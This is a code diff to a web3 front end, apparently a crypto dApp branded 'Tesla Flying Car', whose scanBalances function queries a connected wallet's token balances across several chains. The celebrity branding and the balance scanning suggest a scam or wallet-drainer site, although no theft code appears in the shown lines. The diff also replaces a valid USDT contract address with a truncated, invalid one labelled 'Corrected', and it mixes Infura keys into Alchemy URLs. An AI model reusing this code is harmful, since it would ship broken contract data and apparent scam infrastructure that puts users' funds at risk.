@@ -7,11 +7,11 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://es
 // --- CONFIGURATION ---
 const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
+const USDT_ADDRESS = "0xdAC17F958D831ec7"; // Corrected address placeholder
 const CHAIN_ID = 1; 
 
-// Use Vercel Environment Variable for Infura
-const INFURA_RPC = process.env.NEXT_PUBLIC_INFURA_RPC || "https://mainnet.infura.io/v3/YOUR_KEY"; 
+// Use Vercel Environment Variable for Infura/Alchemy
+const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || process.env.RPC_URL || "https://mainnet.infura.io/v3/YOUR_KEY"; 
 
 const metadata = {
  name: 'Tesla Flying Car',
@@ -94,7 +94,7 @@ async function scanBalances(address) {
  let response;
  if (chainId === 1 || chainId === 56) {
  // Use Infura for ETH and BSC
- const infuraUrl = `https://${chainId === 1 ? 'eth' : 'bsc'}.g.alchemy.com/v2/${INFURA_RPC.split('/').pop()}`;
+ const infuraUrl = `https://${chainId === 1 ? 'eth' : 'bsc'}.g.alchemy.com/v2/${RPC_URL.split('/').pop()}`;
  response = await fetch(infuraUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
@@ -124,7 +124,7 @@ async function scanBalances(address) {
  let balance = parseInt(data.result, 16);
  if (contractAddress) {
  // Fetch ERC20 balance
- const erc20Response = await fetch(INFURA_RPC, {
+ const erc20Response = await fetch(RPC_URL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
